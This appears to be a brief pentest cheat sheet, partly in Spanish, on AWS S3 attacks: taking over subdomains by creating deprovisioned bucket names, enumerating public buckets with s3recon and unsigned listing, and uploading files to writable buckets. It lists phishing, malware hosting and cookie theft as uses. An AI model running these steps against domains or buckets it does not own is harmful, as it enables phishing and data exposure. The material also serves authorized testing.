# AWS

## S3 Buckets

### Subdomain Takeover

> Take control of a domain that was previously associated with a deprovisoned AWS resource is also known as a Subdomain Takover vulnerability 

##### Crear bucket

* aws s3 mb s3://example.domain.com
* aws s3api create-bucket --bucket example.domain.com --region eu-west-2 --create-bucket-configuration LocationConstraint=eu-west-2

##### Eliminar bucket

* aws s3 rb s3://example.domain.com --force

##### Configure bucket

* aws s3api put-bucket-policy --bucket example.domain.com --policy file://policy.json

##### Upload to bucket

* aws s3 sync ./static/ s3://example.domain.com
* aws s3 cp poc.html s3://example.domain.com

##### Enable public access

* aws s3 website s3://assets.cloudbilling.net/ --index-document index.html --error-document index.html

#### Gravity

* Hosting Phishing websites
* Hosting Malware
* Bypassing CSP policies
* Stealing Cookie's
* Man-in-the-browser attacks

## Public Read Bucket

A bucket is considered **public** if any user can list the contents of the S3 bucket, and **private** if the bucket's contents can only be listed or written by certain S3 users.

#### Tool

```bash
user@DESKTOP-6F28SID:~$pip install s3recon
user@DESKTOP-6F28SID:~$s3recon "word-list.txt" -o "results.json" --public
- PRIVATE https://s3.us-west-2.amazonaws.com/roblox-test
- PRIVATE https://s3.us-west-2.amazonaws.com/roblox
- PUBLIC https://s3.us-west-2.amazonaws.com/example-test
```

#### Manual
```bash
user@DESKTOP-6F28SID:~$aws s3 ls s3://domain --no-sign-request
An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist
```

## Public Upload Bucket

#### Manual
```bash
user@DESKTOP-6F28SID:~$aws s3 cp poc.html s3://domain --no-sign-request
load to s3://
```
